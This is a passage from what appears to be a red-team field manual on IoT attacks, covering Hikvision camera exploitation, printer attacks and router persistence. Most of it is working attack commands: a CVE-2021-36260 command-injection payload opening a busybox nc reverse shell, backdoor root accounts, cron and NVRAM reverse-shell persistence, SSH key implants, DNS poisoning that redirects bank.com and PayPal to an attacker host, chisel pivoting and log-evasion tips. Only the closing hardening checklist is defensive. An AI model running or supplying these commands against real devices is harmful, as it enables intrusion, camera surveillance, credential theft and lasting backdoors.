/tmp/chisel client 10.10.10.50:8080 R:socks &
# Now access ALL devices on the internal network from Kali!
```

---

## 28. IP Camera Exploitation — Full Chain

```bash
# ══════════════════════════════════════════════════════════════════
# FULL CHAIN: Discover → Exploit → Access footage → Persist
# Target: Hikvision IP Camera (CVE-2021-36260)
# ══════════════════════════════════════════════════════════════════

# ── PHASE 1: DISCOVERY ────────────────────────────────────────────
# Find cameras on network:
sudo nmap -p 554,80,8000 --open 192.168.1.0/24
# Port 8000 = Hikvision SDK port (confirms Hikvision camera)

# ── PHASE 2: FINGERPRINT ──────────────────────────────────────────
curl -s http://192.168.1.100/
# Expected: Hikvision login page → confirms brand

# Check firmware version (may be unauthenticated):
curl -s http://192.168.1.100/System/deviceInfo --user admin:12345
# OR without auth on vulnerable versions:
curl -s http://192.168.1.100/System/deviceInfo

# ── PHASE 3: EXPLOIT CVE-2021-36260 ──────────────────────────────
# Unauthenticated RCE — no credentials needed!

# Verify vulnerability (reboot command):
curl -X PUT "http://192.168.1.100/SDK/webLanguage" \
  --header "Content-Length: 68" \
  --data '<?xml version="1.0" encoding="UTF-8"?><language>$(id>>/tmp/test)</language>'

# Check if command executed:
curl "http://192.168.1.100/tmp/test"
# Expected: uid=0(root)

# Get reverse shell:
# Listener on Kali: nc -lvnp 4444
curl -X PUT "http://192.168.1.100/SDK/webLanguage" \
  --header "Content-Length: 150" \
  --data '<?xml version="1.0" encoding="UTF-8"?><language>$(busybox nc 10.10.10.50 4444 -e sh &)</language>'
# Expected: root shell from camera!

# ── PHASE 4: ACCESS FOOTAGE ───────────────────────────────────────
# From the shell:
# Find recorded footage:
find / -name "*.mp4" -o -name "*.avi" -o -name "*.264" 2>/dev/null
ls /mnt/data/record/  # Common recording location

# Stream live feed via RTSP (with found credentials):
vlc rtsp://admin:12345@192.168.1.100/Streaming/Channels/101
# Or after cracking default credentials:
curl -s "http://192.168.1.100/ISAPI/Streaming/channels" -u admin:12345

# ── PHASE 5: PERSISTENCE ──────────────────────────────────────────
# Cameras are embedded Linux — same persistence as routers:
echo "backdoor:x:0:0:root:/:/bin/sh" >> /etc/passwd
echo "* * * * * busybox nc 10.10.10.50 4444 -e sh" >> /var/spool/cron/crontabs/root
```

---

## 30. Printers — The Forgotten Attack Surface

```bash
# Printers: network-connected, rarely patched, often accessible to all
# on internal network, store all printed documents, can move laterally

# ── DISCOVER PRINTERS ─────────────────────────────────────────────
sudo nmap -p 9100,515,631,80,443 --open 192.168.1.0/24
# Port 9100 = JetDirect (raw printing)
# Port 515  = LPD (Line Printer Daemon)
# Port 631  = IPP (Internet Printing Protocol, CUPS)

# ── PRET — PRINTER EXPLOITATION TOOLKIT ──────────────────────────
git clone https://github.com/RUB-NDS/PRET
cd PRET

# Connect to printer:
python3 pret.py 192.168.1.200 pjl   # HP PCL/PJL printers
python3 pret.py 192.168.1.200 ps    # PostScript printers

# In PRET shell:
pret> info               # Printer info (model, firmware)
pret> ls                 # List files on printer's filesystem!
pret> cat /etc/passwd    # Read files (yes, some printers have /etc/passwd)
pret> env                # Show environment variables
pret> nvram get          # Read NVRAM (stored credentials!)
pret> display "HACKED"   # Change display message (PoC)

# Print a file (exfiltrate documents printed by others):
pret> printjob /tmp/

# ── GET STORED CREDENTIALS ────────────────────────────────────────
# Many printers store LDAP/email credentials for scanning:
curl http://192.168.1.200/webconf/pages/wja/wja_deviceinfo.html
# Or: check admin web interface → Address Book → LDAP settings
# Expected: LDAP bind account + password (often domain service account!)

# ── PJL ATTACKS ───────────────────────────────────────────────────
# JetDirect on port 9100 (raw):
nc 192.168.1.200 9100
# Type: @PJL INFO ID
# Expected: HP LASERJET PRO M404n
@PJL FSQUERY FORMAT:BINARY NAME="0:/" SIZE=0

# Read directory listing:
@PJL FSQUERY FORMAT:BINARY NAME="0:/"
# Expected: filesystem listing of printer storage!
```

---

# PART 8 — POST-EXPLOITATION ON EMBEDDED DEVICES

---

## 31. Persistence on Routers & Embedded Linux

```bash
# ── PERSISTENT REVERSE SHELL VIA CRON ────────────────────────────
# Most embedded Linux has cron (via BusyBox or crond):
echo "*/5 * * * * busybox nc 10.10.10.50 4444 -e sh 2>/dev/null" \
  >> /var/spool/cron/crontabs/root

# ── STARTUP SCRIPTS ────────────────────────────────────────────────
# Find init scripts:
ls /etc/init.d/
# Add to existing startup script:
echo "busybox nc 10.10.10.50 4444 -e sh &" >> /etc/init.d/boot

# ── BACKDOOR ACCOUNT ──────────────────────────────────────────────
# Add to /etc/passwd (if not read-only):
echo "backdoor:$(openssl passwd -1 password123):0:0:root:/root:/bin/sh" >> /etc/passwd

# ── SSH AUTHORIZED KEY (if SSH running) ────────────────────────────
mkdir -p /root/.ssh
echo "ssh-ed25519 AAAA... attacker@kali" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
chmod 700 /root/.ssh

# ── MODIFY NVRAM (PERSISTENT ACROSS REBOOTS) ─────────────────────
# OpenWRT/DD-WRT store config in NVRAM:
nvram set rc_startup="busybox nc 10.10.10.50 4444 -e sh &"
nvram commit
# Every boot → connects back to your listener!
```

---

## 32. Using Routers as Pivot Points

```bash
# SCENARIO: You own the router, want to reach devices behind it

# ── TRAFFIC CAPTURE (PASSIVE PIVOT) ──────────────────────────────
# The router sees ALL traffic from ALL connected devices
tcpdump -i br-lan -w /tmp/capture.pcap host not 192.168.1.100 &
# Captures all traffic from all clients
# Transfer to Kali and analyze with Wireshark
scp root@192.168.1.1:/tmp/capture.pcap /kali/loot/

# ── DNS POISONING (ALL CLIENTS AFFECTED) ──────────────────────────
# Router IS the DNS server for all clients
# Modify dnsmasq config:
cat >> /etc/dnsmasq.conf << 'EOF'
address=/bank.com/10.10.10.50        # Redirect bank.com to attacker
address=/paypal.com/10.10.10.50      # Redirect PayPal to attacker
EOF
/etc/init.d/dnsmasq restart
# All devices using this router now get poisoned DNS!

# ── CHISEL SOCKS PROXY ────────────────────────────────────────────
# Transfer Chisel MIPS binary:
wget http://10.10.10.50:8080/chisel_mips -O /tmp/chisel
chmod +x /tmp/chisel
/tmp/chisel client 10.10.10.50:8080 R:socks &
# Kali now has SOCKS access to entire network behind router!
proxychains4 nmap -sT 192.168.1.0/24  # Scan all clients!

# ── PORT FORWARDING VIA IPTABLES ──────────────────────────────────
# Forward external traffic to internal device:
iptables -t nat -A PREROUTING -p tcp --dport 3389 -j DNAT --to 192.168.1.50:3389
iptables -t nat -A POSTROUTING -j MASQUERADE
# Now: external connection to router's public IP:3389 → reaches internal workstation!
```

---

# PART 9 — OPSEC & DETECTION

---

## 34. What IoT Attacks Leave Behind

```
IoT ATTACK ARTIFACTS:

WEB ADMIN ATTACKS:
  → HTTP access logs (if logging enabled — often it's not)
  → Failed login attempts in auth.log
  → Router logs: "Admin logged in from 192.168.1.50"
  
COMMAND INJECTION:
  → Strange processes in ps output (nc, wget, curl)
  → New files in /tmp
  → Network connections to unknown external IPs
  → Syslog entries showing unusual commands
  
TELNET/SSH:
  → Auth logs: "Login from 192.168.1.50"
  → Active session visible to admin
  
FIRMWARE MODIFICATION:
  → Changed firmware version after reboot
  → Different configuration than factory
  → Modified /etc/passwd timestamps
  
TRAFFIC CAPTURE:
  → tcpdump process running (visible in ps)
  → Large /tmp files filling flash storage
  → Increased load on device

DETECTION AVOIDANCE:
  - Work during normal business hours (traffic blends in)
  - Clean up /tmp after attacks
  - Kill tcpdump immediately after use
  - Keep sessions short — don't maintain persistent connections
  - Use Telnet sparingly (cleartext captured by any other device on network)
  - Router/camera logs often overwrite themselves — short retention
  - Most embedded devices have NO SIEM integration
    = very low detection probability
```

---

## 35. IoT Hardening Checklist

```
╔══════════════════════════════════════════════════════════════════╗
║              IoT HARDENING CHECKLIST                            ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                  ║
║  NETWORK SEGMENTATION (most important)                          ║
║  □ Put ALL IoT devices on a separate VLAN                       ║
║  □ IoT VLAN has NO access to corporate/internal LAN            ║
║  □ IoT VLAN only allows outbound internet (specific ports)      ║
║  □ No IoT device can communicate with another (client isolate)  ║
║                                                                  ║
║  CREDENTIALS                                                     ║
║  □ Change ALL default passwords on day 1                        ║
║  □ Use strong unique passwords (not the same on all devices)    ║
║  □ Disable Telnet — SSH only                                    ║
║  □ Disable remote management if not needed                      ║
║                                                                  ║
║  FIRMWARE                                                        ║
║  □ Enable automatic firmware updates where possible             ║
║  □ Check vendor's security bulletins monthly                    ║
║  □ Replace devices that no longer receive updates               ║
║  □ Avoid brands known for poor security track record            ║
║                                                                  ║
║  SERVICES                                                        ║
║  □ Disable UPnP on ALL routers                                  ║
║  □ Disable WPS (Wi-Fi Protected Setup) on all APs               ║
║  □ Disable SNMP v1/v2c (use v3 or disable)                      ║
║  □ Disable Telnet (use SSH only)                                 ║
║  □ Restrict admin panel to management subnet only               ║
║                                                                  ║
║  MONITORING                                                      ║
║  □ Add IoT devices to asset inventory                           ║
║  □ Monitor unusual outbound connections from IoT VLAN           ║
║  □ Alert on new devices connecting to IoT VLAN                  ║
║  □ Periodic port scans of IoT VLAN                              ║
╚══════════════════════════════════════════════════════════════════╝
```

---

*Next module: **Mobile Pentesting (Android/iOS)** — APK reverse engineering, Frida dynamic instrumentation, traffic interception, SSL pinning bypass, insecure storage, intent vulnerabilities, and full mobile app pentest methodology.*

*Cross-references:*
- *SNMP full attack: `Ports_Protocols_RedTeam_Field_Manual.md` Section 12*
- *Telnet/SSH attacks: `Ports_Protocols_RedTeam_Field_Manual.md` Sections 6, 7*
- *Using IoT device as pivot: `Network_Pivoting_Tunneling_RedTeam_Field_Manual.md`*
- *Web admin interface attacks: `Web_Application_Security_RedTeam_Field_Manual.md`*

*Tools: Binwalk, Firmwalker, FirmAE, QEMU, Ghidra, RouterSploit, PRET,*
*Binwalk, Flashrom, OpenOCD, Minicom, Mosquitto-clients, Bettercap,*
*Gatttool, Hcitool, Nmap, Shodan CLI*

*Labs: OWASP IoTGoat (free, purpose-built vulnerable firmware), FirmAE emulation,*
*Damn Vulnerable Router Firmware (DVRF), Physical cheap routers ($5-15 on eBay),*
*Shodan for finding real exposed devices (for observation only — never attack unauthorized)*